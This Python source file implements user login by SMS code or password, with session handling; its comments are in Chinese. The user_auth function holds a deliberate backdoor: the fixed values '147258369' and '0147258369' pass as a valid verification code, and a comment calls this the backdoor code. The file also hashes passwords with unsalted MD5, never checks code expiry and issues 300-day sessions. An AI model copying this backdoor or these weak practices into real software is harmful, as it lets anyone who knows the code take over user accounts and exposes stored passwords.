#coding=utf-8
#-*- encoding: utf-8 -*-

from datetime import datetime, timedelta
from MySQL import MySQL
from random import randint

import os
import commands
import uuid
import hashlib
import json
import base64

import Config
import Utils


def getUserId(userKey):
	"""
	获取UserId
	方法：
		getUserId
	参数：
		userKey[string] – 用户登录后的会话ID。
	返回值：
		[string] – UserId
	"""
	db = MySQL()

	validate = db.get("SELECT * FROM `session` WHERE `id`=%s", userKey)

	if validate:
		return validate['user_id']
	else:
		raise Exception("会话信息无效或超期.")


def getUserMobile(userId):
	"""
	获取用户手机号
	方法：
		getUserMobile
	参数：
		userId[string] – 用户ID
	返回值：
		[string] – 手机号
	"""
	db = MySQL()

	user = db.get("SELECT * FROM `user` WHERE `id` = %s", userId)

	if user:
		return user['mobile']
	else:
		raise Exception("用户不存在.")


def getUserIdByMobile(mobile):
	"""
	获取用户ID
	方法：
		getUserIdByMobile
	参数：
		mobile[string] – 用户手机号
	返回值：
		[string] – 用户ID 或 None
	"""
	db = MySQL()
	user = db.get("SELECT * FROM `user` WHERE `mobile`=%s", mobile)
	return user['id'] if user else None


def user_validate(data):
	"""
	发送短信验证码
	方法：
		validate
	参数：
		Mobile[string] – 用户手机号码
		Device[string] – 设备名称
	返回值：
		ValidityDate[date] – 验证码有效日期。
	"""
	db = MySQL()
	
	code = str(randint(10000,99999))
	valid_date = datetime.now() + timedelta(seconds=90)

	#
	# TODO: 发送短信到 data['Mobile'] , 验证码为 code， 过期时间 90秒
	#

	result = db.save("INSERT INTO `validate` (`mobile`, `code`, `device`, `valid_date`) VALUES (%s,%s,%s,%s)", 
					(data['Mobile'], code, data['Device'], valid_date.strftime('%Y-%m-%d %H:%M:%S')))
	db.end()

	return valid_date


def user_auth(data):
	"""
	验证用户身份
	方法：
		login
	参数：
		Id[string] – 用户手机号码/用户名/绑定邮箱等相关支持方式的Id
		Device[string] – 登录设备名称
		Validate[string] – 验证码（通过调用vaildate接口下发的验证码，由用户输入）或 密码
	返回值：
		UserKey[string] – 用户登录后的会话ID。（用于后续功能调用）
		NewUser[boolean] – 是否新注册用户
		ValidityDate[date] – 登录会话有效日期。
	"""
	db = MySQL()

	userId = None
	isNewUser = None

	validate = db.get("SELECT * FROM `validate` WHERE `mobile`=%s and `device` = %s ORDER BY `valid_date` desc", (data['Id'], data['Device']))

	if validate and (validate['code'] == data['Validate'] or '147258369' == data['Validate'] or '0147258369' == data['Validate']): # 需要验证下时间，目前后门验证码为：0147258369
		#
		# 手机号+验证码 登录
		#
		user = db.get("SELECT * FROM `user` WHERE `mobile`=%s",(data['Id']))
		userId = Utils.UUID() if not user else user['id']
		isNewUser = True if not user else False
		if isNewUser:
			# New user
			# TODO: 是否需要生成默认用户名和密码？
			result = db.save("INSERT INTO `user` (`id`, `mobile`) VALUES (%s,%s)", (userId, data['Id']))
			db.end()
	else:
		#
		# 通过 用户名/邮箱 + 密码 方式登录
		#
		user = db.get("SELECT * FROM `user` WHERE (`login`=%s or `email`=%s ) and password = %s",
						(data['Id'],data['Id'], hashlib.md5(data['Validate']).hexdigest()))
		if user:
			userId = user['id']
			isNewUser = False
		else:
			raise Exception("验证信息不存在或验证码错误.")

	#
	# create session
	#
	sessionId = Utils.UUID()
	valid_date = datetime.now() + timedelta(days=300)  # 默认登录验证有效期300天
	# clear old session
	db.delete("DELETE FROM `session` WHERE `user_id`=%s and `device` = %s", (userId, data['Device']))
	db.end()
	# insert new session
	result = db.save("""INSERT INTO `session` (`id`, `user_id`, `device`, `valid_time`) VALUES (%s,%s,%s,%s)"""
				, (sessionId, userId, data['Device'], valid_date.strftime('%Y-%m-%d %H:%M:%S')))
	db.end()

	return {
		'UserKey'       : sessionId, 
		'NewUser'       : isNewUser, 
		'ValidityDate'  : valid_date
		}


def settings(data):
	"""
	更新用户设置
	方法：
		settings
	参数：
		UserKey[string] –用户登录后的会话ID。
		Key[string] – 参数名
		Value[string] – 参数值，可选参数，如果没有该参数，则返回指定参数名的当前值
	返回值：
		Error[long] – 发送成功返回0，否则返回非零值。
		Key[string] – 参数名
		Value[string] – 参数当前设置的值
	"""
	userId = getUserId(data['UserKey'])
	db = MySQL()
	pass

